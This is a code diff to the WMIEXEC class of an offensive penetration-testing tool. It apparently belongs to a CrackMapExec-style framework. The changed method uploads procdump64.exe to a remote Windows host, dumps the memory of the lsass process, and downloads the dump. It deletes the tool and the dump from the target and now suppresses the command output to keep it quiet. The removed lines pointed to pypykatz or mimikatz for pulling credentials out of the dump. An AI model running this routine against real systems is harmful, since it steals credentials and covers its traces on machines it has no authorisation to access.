@@ -253,6 +253,9 @@ class WMIEXEC:
 
         Thanks https://gist.githubusercontent.com/knavesec/0bf192d600ee15f214560ad6280df556/raw/36ff756346ebfc7f9721af8c18dff7d2aaf005ce/autoProc.py
         """
+        from contextlib import redirect_stdout
+        import io
+
         if not cfg.PROC_PATH.is_file():
             self.logger.error('procdump64.exe not found at {}'.format(str(cfg.PROC_PATH)))
             self.logger.error('Place procdump64.exe in location or update config.py and rebuild'.format(str(cfg.PROC_PATH)))
@@ -265,21 +268,25 @@ class WMIEXEC:
         self.__remoteshell.do_put(str(cfg.PROC_PATH)) # default path is /.cmx/procdump64.exe
         time.sleep(1)
 
-        self.logger.announce('Sleeping to allow procdump to finish')
-        self.__remoteshell.onecmd('procdump64.exe -ma -accepteula lsass safe.dmp')
+        self.logger.announce('Waiting for procdump to finish')
+
+        f = io.StringIO()
+        with redirect_stdout(f): # lil hack to hide output
+            self.__remoteshell.onecmd('procdump64.exe -ma -accepteula lsass safe.dmp ')
         time.sleep(8)
         
         self.logger.announce('Downloading dump file to current directory')
         self.__remoteshell.do_get('safe.dmp')
 
-        self.logger.success('Finished, now cleaning up on target')
-        self.__remoteshell.onecmd('del procdump64.exe')
-        self.__remoteshell.onecmd('del safe.dmp')
+        self.logger.success('Success, now cleaning up on target.')
+        with redirect_stdout(f):
+            self.__remoteshell.onecmd('del procdump64.exe')
+            self.__remoteshell.onecmd('del safe.dmp')
         self.__remoteshell.do_exit('')
 
-        self.logger.highlight('Credentials can now be extracted using pypykatz or running mimikatz locally')
-        self.logger.highlight('i.e.    pypykatz lsa minidump safe.dmp')
-        self.logger.highlight('Check current directory for the dmp file')
+        #self.logger.highlight('Credentials can now be extracted using pypykatz or running mimikatz locally')
+        #self.logger.highlight('i.e.    pypykatz lsa minidump safe.dmp')
+        return str(cfg.DUMP_PATH)
 
 
 ###################################################################################################
